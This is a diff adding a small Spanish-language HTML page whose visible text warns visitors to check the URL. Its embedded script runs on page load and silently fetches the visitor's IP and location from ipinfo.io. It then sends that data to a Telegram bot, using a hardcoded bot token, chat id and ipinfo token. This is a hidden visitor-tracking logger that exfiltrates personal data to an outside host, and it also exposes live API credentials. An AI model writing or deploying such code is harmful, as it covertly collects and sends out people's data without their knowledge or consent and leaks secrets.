@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sitio</title>
+    <style>
+        body{
+            background-color: aquamarine;
+            background-image: url('https://scontent.fgua2-2.fna.fbcdn.net/v/t39.30808-6/316669439_10167062241865254_315357901622813842_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=127cfc&_nc_ohc=Ocka_TlbhAEQ7kNvgEcbUaE&_nc_ht=scontent.fgua2-2.fna&oh=00_AYBWohbIZUECD_9ydkaF8DvIp4W62j2cxAW_Vqub1K4S7g&oe=66AE369A');
+            background-size: cover; 
+            color: antiquewhite; 
+            font-size: 28px; 
+            text-align: center;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const botToken = '7226998180:AAEo0msO3JNotD3CHmWSZ6bp0VVpoP6zUBo';
+            const chatId = '280622753';
+            const ipinfoToken = 'f65b664d272a64';
+
+            // Obtener la información de la IP del visitante
+            fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
+                .then(response => response.json())
+                .then(data => {
+                    const info = JSON.stringify(data, null, 2);
+                    const message = `Usuario Ingresado:\n${info}`;
+
+                    // Enviar mensaje a Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log('Mensaje enviado correctamente.');
+                        } else {
+                            console.error('Error al enviar el mensaje:', data);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error en la solicitud:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error al obtener la información de la IP:', error);
+                });
+        });
+    </script>
+</head>
+<body>
+    <h1>¡Cuidado!</h1>
+    <h2>Recuerda revisar la URL</h2>
+</body>
+</html>
